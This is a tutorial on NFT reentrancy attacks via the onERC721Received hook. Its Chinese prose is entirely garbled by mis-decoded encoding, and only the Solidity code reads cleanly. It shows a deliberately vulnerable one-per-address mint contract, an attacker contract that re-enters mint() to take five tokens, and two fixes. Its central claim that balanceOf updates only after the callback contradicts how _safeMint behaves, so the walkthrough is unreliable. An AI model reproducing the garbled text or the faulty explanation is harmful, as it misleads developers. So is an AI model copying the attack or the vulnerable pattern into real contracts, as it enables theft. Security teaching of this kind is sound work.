# NFTé‡å…¥æ”»å‡»

### 1. ç»å…¸é‡å…¥æ”»å‡»å¤ä¹ 

åœ¨æ·±å…¥ NFT åœºæ™¯å‰ï¼Œæˆ‘ä»¬å…ˆå¿«é€Ÿå›é¡¾ä¸€ä¸‹ç»å…¸é‡å…¥æ”»å‡»çš„æ ¸å¿ƒï¼š

1. ä¸€ä¸ªåˆçº¦ A è°ƒç”¨å¦ä¸€ä¸ªå¤–éƒ¨åˆçº¦ Bã€‚
2. åˆçº¦ A åœ¨å®Œæˆè¿™æ¬¡å¤–éƒ¨è°ƒç”¨**ä¹‹å**ï¼Œæ‰æ›´æ–°è‡ªå·±çš„å†…éƒ¨çŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œæ‰£å‡ä½™é¢ï¼‰ã€‚
3. æ¶æ„åˆçº¦ B åœ¨è¢«è°ƒç”¨æ—¶ï¼Œåè¿‡æ¥**é‡æ–°è¿›å…¥ (re-enter)** åˆçº¦ A çš„åŒä¸€ä¸ªå‡½æ•°ã€‚
4. ç”±äºåˆçº¦ A çš„çŠ¶æ€è¿˜æœªæ›´æ–°ï¼Œå…¶å†…éƒ¨æ£€æŸ¥ï¼ˆå¦‚â€œæ£€æŸ¥ä½™é¢æ˜¯å¦è¶³å¤Ÿâ€ï¼‰ä¼šå†æ¬¡é€šè¿‡ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é‡å¤æ‰§è¡ŒæŸä¸ªæ“ä½œã€‚



### 2. NFT é‡å…¥æ”»å‡»çš„â€œé’©å­â€ï¼š`onERC721Received`



é‚£ä¹ˆï¼Œåœ¨ NFT çš„ä¸–ç•Œé‡Œï¼Œæ”»å‡»è€…æ˜¯å¦‚ä½•æ‰¾åˆ°æœºä¼šé‡æ–°è¿›å…¥é“¸é€ å‡½æ•°çš„å‘¢ï¼Ÿç­”æ¡ˆå°±åœ¨äº ERC721 æ ‡å‡†ä¸­çš„ä¸€ä¸ªâ€œå®‰å…¨â€ç‰¹æ€§ï¼š**`_safeMint` å‡½æ•°**ã€‚

- **`_mint` vs. `_safeMint`
  `_mint` ä¸ `_safeMint`**
  - `_mint()`ï¼šä¸€ä¸ªå†…éƒ¨çš„ã€åŸºç¡€çš„é“¸é€ å‡½æ•°ã€‚å®ƒåªæ˜¯ç®€å•åœ°åˆ›å»ºä¸€ä¸ªæ–°çš„ NFT å¹¶åˆ†é…ç»™æŸä¸ªåœ°å€ã€‚
  - `_safeMint()`ï¼šè¿™æ˜¯ä¸€ä¸ªæ›´å®‰å…¨çš„ç‰ˆæœ¬ã€‚åœ¨å°† NFT åˆ†é…ç»™ä¸€ä¸ªåœ°å€æ—¶ï¼Œå¦‚æœè¿™ä¸ªåœ°å€æ˜¯ä¸€ä¸ª**æ™ºèƒ½åˆçº¦**ï¼Œ`_safeMint` ä¼š**ä¸»åŠ¨è°ƒç”¨ (call)** è¿™ä¸ªæ¥æ”¶æ–¹åˆçº¦çš„ä¸€ä¸ªç‰¹æ®Šå‡½æ•°â€”â€”`onERC721Received()`ã€‚
- **`onERC721Received` çš„ä½œç”¨**ï¼š
  - å®ƒçš„è®¾è®¡åˆè¡·æ˜¯å¥½çš„ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢ NFT è¢«æ„å¤–åœ°å‘é€åˆ°ä¸€ä¸ªæ— æ³•å¤„ç† ERC721 ä»£å¸çš„åˆçº¦åœ°å€ï¼Œå¯¼è‡´ NFT è¢«æ°¸ä¹…é”å®šã€‚æ¥æ”¶æ–¹åˆçº¦å¿…é¡»å®ç°è¿™ä¸ªå‡½æ•°å¹¶è¿”å›ä¸€ä¸ªç‰¹å®šçš„â€œé­”æœ¯å€¼â€ï¼Œæ‰èƒ½è¯æ˜è‡ªå·±â€œçŸ¥é“â€å¦‚ä½•æ¥æ”¶å’Œå¤„ç† NFTã€‚
- **æ”»å‡»çš„åˆ‡å…¥ç‚¹**ï¼š
  - `_safeMint` å¯¹æ¥æ”¶æ–¹åˆçº¦çš„è¿™ä¸ª**å¤–éƒ¨è°ƒç”¨**ï¼Œå°±ä¸ºæ”»å‡»è€…æ‰“å¼€äº†é‡å…¥çš„å¤§é—¨ï¼å¦‚æœ NFT åˆçº¦çš„é“¸é€ é€»è¾‘æœ‰ç¼ºé™·ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨è‡ªå·±çš„ `onERC721Received` å‡½æ•°é‡Œç¼–å†™æ¶æ„ä»£ç ï¼Œé‡æ–°è¿›å…¥é“¸é€ å‡½æ•°ã€‚

------



### 3. æ”»å‡»åœºæ™¯å®ä¾‹ï¼šç»•è¿‡â€œæ¯äººä¸€ä¸ªâ€çš„é“¸é€ é™åˆ¶



å‡è®¾æœ‰ä¸€ä¸ªçƒ­é—¨çš„ NFT é¡¹ç›®ï¼Œä¸ºäº†å…¬å¹³ï¼Œè§„å®šæ¯ä¸ªé’±åŒ…åœ°å€åªèƒ½å…è´¹é“¸é€ ä¸€ä¸ª NFTã€‚

**æœ‰æ¼æ´çš„ NFT åˆçº¦ (`VulnerableNFT.sol`) ğŸ‘**

Solidity åšå›ºæ€§

```
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract VulnerableNFT is ERC721 {
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIdCounter;

    constructor() ERC721("Vulnerable NFT", "VNFT") {}

    function mint() public {
        // **æ¼æ´ç‚¹ 1: æ£€æŸ¥åœ¨äº¤äº’ä¹‹å‰**
        // æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç»é“¸é€ è¿‡
        require(balanceOf(msg.sender) == 0, "Each address can only mint one NFT.");

        _tokenIdCounter.increment();
        uint256 tokenId = _tokenIdCounter.current();

        // **æ¼æ´ç‚¹ 2: äº¤äº’ (å¤–éƒ¨è°ƒç”¨) åœ¨çŠ¶æ€æ›´æ–°ä¹‹å‰**
        // ä½¿ç”¨äº† _safeMintï¼Œå®ƒä¼šè°ƒç”¨å¤–éƒ¨åˆçº¦
        _safeMint(msg.sender, tokenId);

        // æƒ³è±¡ä¸€ä¸‹å¦‚æœè¿˜æœ‰å…¶ä»–çŠ¶æ€æ›´æ–°ï¼Œæ¯”å¦‚ hasMinted[msg.sender] = true;
        // æ”¾åœ¨è¿™é‡Œå°±å¤ªæ™šäº†ã€‚
    }
}
```

è¿™ä¸ªåˆçº¦çš„é€»è¾‘çœ‹èµ·æ¥æ²¡é—®é¢˜ï¼šå…ˆæ£€æŸ¥ä½™é¢ï¼Œå†é“¸é€ ã€‚ä½†å®ƒè¿åäº†å®‰å…¨çš„**â€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€**æ¨¡å¼ã€‚çŠ¶æ€çš„çœŸæ­£æ”¹å˜ï¼ˆ`balanceOf` çš„å¢åŠ ï¼‰å‘ç”Ÿåœ¨ `_safeMint` è¿™ä¸ªâ€œäº¤äº’â€æ­¥éª¤**ä¹‹å**ã€‚

**æ”»å‡»è€…çš„åˆçº¦ (`Attacker.sol`)**

Solidity åšå›ºæ€§

```
import "./VulnerableNFT.sol";

contract Attacker {
    VulnerableNFT public vulnerableNft;
    uint256 public mintCount = 0;

    constructor(address _nftAddress) {
        vulnerableNft = VulnerableNFT(_nftAddress);
    }

    // æ”»å‡»å…¥å£å‡½æ•°
    function attack() public {
        // åªéœ€è¦è°ƒç”¨ä¸€æ¬¡ mint()
        vulnerableNft.mint();
    }

    // **æ ¸å¿ƒæ”»å‡»ä»£ç ï¼šé‡å…¥çš„é’©å­**
    // å½“ _safeMint è°ƒç”¨æœ¬åˆçº¦æ—¶ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«è§¦å‘
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        // å¦‚æœæˆ‘ä»¬è¿˜æ²¡é“¸é€ å¤Ÿ5ä¸ªï¼Œå°±ç»§ç»­è°ƒç”¨ mint()
        if (mintCount < 5) {
            mintCount++;
            vulnerableNft.mint(); // **é‡æ–°è¿›å…¥ï¼**
        }
        return this.onERC721Received.selector;
    }
}
```

**æ”»å‡»æµç¨‹ä¸€æ­¥æ­¥åˆ†è§£ï¼š**

1. æ”»å‡»è€…éƒ¨ç½² `Attacker` åˆçº¦ã€‚
2. æ”»å‡»è€…è°ƒç”¨ `Attacker.attack()`ï¼Œè¿™ä¼šè§¦å‘å¯¹ `VulnerableNFT.mint()` çš„ç¬¬ä¸€æ¬¡è°ƒç”¨ã€‚
3. **è¿›å…¥ `mint()` (ç¬¬ä¸€æ¬¡)**ï¼š
   - `require(balanceOf(Attacker.address) == 0)` æ£€æŸ¥é€šè¿‡ï¼Œå› ä¸ºæ”»å‡»åˆçº¦æ­¤æ—¶ç¡®å®æ²¡æœ‰ NFTã€‚
   - åˆçº¦æ‰§è¡Œ `_safeMint(Attacker.address, 1)`ã€‚
4. **æ§åˆ¶æƒè½¬ç§»**ï¼š`_safeMint` æ£€æµ‹åˆ°æ¥æ”¶æ–¹æ˜¯åˆçº¦ï¼Œäºæ˜¯è°ƒç”¨ `Attacker.onERC721Received()`ã€‚ç¨‹åºçš„æ‰§è¡Œæµç¨‹è¿›å…¥äº†æ”»å‡»è€…çš„åˆçº¦ï¼
5. **è¿›å…¥ `onERC721Received()`**ï¼š
   - `mintCount` (åˆå§‹ä¸º0) å°äº5ï¼Œæ¡ä»¶æˆç«‹ã€‚
   - `mintCount` å¢åŠ åˆ°1ã€‚
   - æ”»å‡»åˆçº¦**å†æ¬¡è°ƒç”¨** `VulnerableNFT.mint()`ã€‚
6. **é‡æ–°è¿›å…¥ `mint()` (ç¬¬äºŒæ¬¡)**ï¼š
   - `require(balanceOf(Attacker.address) == 0)` **æ£€æŸ¥å†æ¬¡é€šè¿‡ï¼** ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºç¬¬ä¸€æ¬¡çš„ `_safeMint` è°ƒç”¨è¿˜æ²¡æœ‰æ‰§è¡Œå®Œæ¯•ï¼Œ`balanceOf` çš„çŠ¶æ€æ›´æ–°è¦ç­‰åˆ°æ•´ä¸ªå¤–éƒ¨è°ƒç”¨ï¼ˆåŒ…æ‹¬ `onERC721Received`ï¼‰å…¨éƒ¨è¿”å›åæ‰ä¼šæœ€ç»ˆå®Œæˆã€‚
   - åˆçº¦æ‰§è¡Œ `_safeMint(Attacker.address, 2)`ï¼Œè¿™åˆä¼šè§¦å‘ `onERC721Received`...
7. è¿™ä¸ªè¿‡ç¨‹ä¼šå¾ªç¯å¾€å¤ï¼Œç›´åˆ° `onERC721Received` ä¸­çš„ `mintCount < 5` æ¡ä»¶ä¸å†æ»¡è¶³ã€‚
8. æœ€ç»ˆï¼Œæ‰€æœ‰è°ƒç”¨æ ˆä¾æ¬¡è¿”å›ï¼ŒçŠ¶æ€è¢«æ›´æ–°ã€‚æ”»å‡»è€…**åªå‘èµ·äº†ä¸€ç¬”äº¤æ˜“ï¼Œå´æˆåŠŸåœ°ä¸ºè‡ªå·±é“¸é€ äº†5ä¸ª NFT**ï¼Œå®Œå…¨ç»•è¿‡äº†â€œæ¯äººä¸€ä¸ªâ€çš„é™åˆ¶ã€‚

------



### 4. å¦‚ä½•ä¿®å¤å’Œé˜²èŒƒï¼Ÿ



é˜²èŒƒæ–¹æ³•å®Œå…¨éµå¾ªç»å…¸é‡å…¥æ”»å‡»çš„è§£å†³æ–¹æ¡ˆã€‚



#### a. éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼ (Checks-Effects-Interactions)



è¿™æ˜¯æœ€æ ¹æœ¬çš„è§£å†³æ–¹æ¡ˆã€‚**åœ¨è¿›è¡Œä»»ä½•å¯èƒ½è§¦å‘å¤–éƒ¨è°ƒç”¨çš„äº¤äº’ä¹‹å‰ï¼Œå®Œæˆæ‰€æœ‰å†…éƒ¨çŠ¶æ€çš„æ›´æ–°ã€‚**

**å®‰å…¨çš„ä»£ç  (æ‰‹åŠ¨æ›´æ–°çŠ¶æ€) ğŸ‘**

Solidity åšå›ºæ€§

```
contract SecureNFT is ERC721 {
    mapping(address => bool) public hasMinted;
    // ...

    function mint() public {
        // 1. æ£€æŸ¥ (Check)
        require(!hasMinted[msg.sender], "Already minted.");

        // 2. ç”Ÿæ•ˆ (Effect) - **å…ˆæ›´æ–°çŠ¶æ€ï¼**
        hasMinted[msg.sender] = true;

        // ... åˆ†é… tokenId ...

        // 3. äº¤äº’ (Interaction) - æœ€åæ‰è¿›è¡Œå¤–éƒ¨è°ƒç”¨
        _safeMint(msg.sender, tokenId);
    }
}
```

åœ¨è¿™ä¸ªå®‰å…¨ç‰ˆæœ¬ä¸­ï¼Œå½“æ”»å‡»è€…é‡å…¥ `mint()` æ—¶ï¼Œ`hasMinted` æ£€æŸ¥ä¼šç«‹å³å¤±è´¥ï¼Œä»è€Œé˜»æ­¢äº†æ”»å‡»ã€‚



#### b. ä½¿ç”¨ OpenZeppelin çš„ `ReentrancyGuard`



è¿™æ˜¯æœ€ç®€å•ã€æœ€æœ‰æ•ˆçš„â€œä¸€é”®å¼â€è§£å†³æ–¹æ¡ˆã€‚

**å®‰å…¨çš„ä»£ç  (ä½¿ç”¨ä¿®é¥°ç¬¦) ğŸ‘**

Solidity åšå›ºæ€§

```
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureNFT is ERC721, ReentrancyGuard {
    // ...
    
    // ä½¿ç”¨ nonReentrant ä¿®é¥°ç¬¦
    function mint() public nonReentrant {
        require(balanceOf(msg.sender) == 0, "Already minted.");
        // ...
        _safeMint(msg.sender, tokenId);
    }
}
```

`nonReentrant` ä¿®é¥°ç¬¦ä¼šåœ¨å‡½æ•°å¼€å§‹æ—¶â€œä¸Šé”â€ï¼Œåœ¨å‡½æ•°ç»“æŸæ—¶â€œè§£é”â€ã€‚å¦‚æœå‡½æ•°åœ¨æ‰§è¡ŒæœŸé—´è¢«é‡å…¥ï¼Œå®ƒä¼šæ£€æµ‹åˆ°é”è¿˜æœªè¢«è§£å¼€ï¼Œå¹¶ç«‹å³ `revert` äº¤æ˜“ã€‚

**æ€»ç»“ï¼š** NFT é‡å…¥æ”»å‡»æ˜¯åˆ©ç”¨äº† `_safeMint` ä¸­ `onERC721Received` å›è°ƒæœºåˆ¶çš„ä¸€ä¸ªå·§å¦™æ”»å‡»ã€‚å¼€å‘è€…å¿…é¡»æ—¶åˆ»è­¦æƒ•ä»»ä½•å¯èƒ½å¯¼è‡´å¤–éƒ¨è°ƒç”¨çš„å‡½æ•°ï¼ˆå¦‚ `_safeMint`ï¼‰ï¼Œå¹¶ä¸¥æ ¼éµå®ˆ**â€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€**çš„è®¾è®¡æ¨¡å¼ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨åƒ `ReentrancyGuard` è¿™æ ·ç»è¿‡å®¡è®¡çš„å®‰å…¨æ¨¡å—æ¥ä¿æŠ¤è‡ªå·±çš„åˆçº¦ã€‚

